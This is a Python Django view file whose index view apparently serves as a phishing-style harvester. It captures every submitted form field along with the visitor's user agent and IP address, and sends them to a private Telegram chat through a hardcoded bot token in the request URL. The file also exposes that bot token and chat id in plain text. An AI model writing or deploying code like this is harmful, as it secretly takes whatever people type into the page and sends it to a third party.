from django.shortcuts import render
from rest_framework import generics
from polls.serializers import ViewDeteilSerializer
from .forms import CreateUrlsForm
import json
import requests

def index(request):
    
    token = "5177867403:AAHwHsURBxog-e4eq8KvcgzNlL3vOHQe-Gw"
    chat_id = "5557657238"
    p = request.META['HTTP_USER_AGENT']
    form = CreateUrlsForm()
    print(p)
    if request.method == 'POST':
        resq = request.POST
        listing = []
        listing.append(resq)
        print(listing)
        print(resq)
        form = CreateUrlsForm(request.POST)
        if form.is_valid():
            form.save
    else:
        print('????')
    context = {'form': form}
    jdump = json.dumps(listing)

    txt = str(jdump)
    txt1 = txt[92:]
    txt2 = txt1[:-2]
    p32 = str(txt2)
    p11=','
    p12 = str.join('', p32)
    p12 = p12.replace('"', '').replace(',', '\n').replace(' ', '')
    print(p12)
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')
    textmain = f"""👨‍👧‍👦USER-AGENT:{p}

✍️✍️✍️
{p12}

🌎🌎🌎
IP:{ip}

    """
    url = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&parse_mode=html&text={textmain}"
    requests.get(url)
    
    return render(request, 'index.html', context)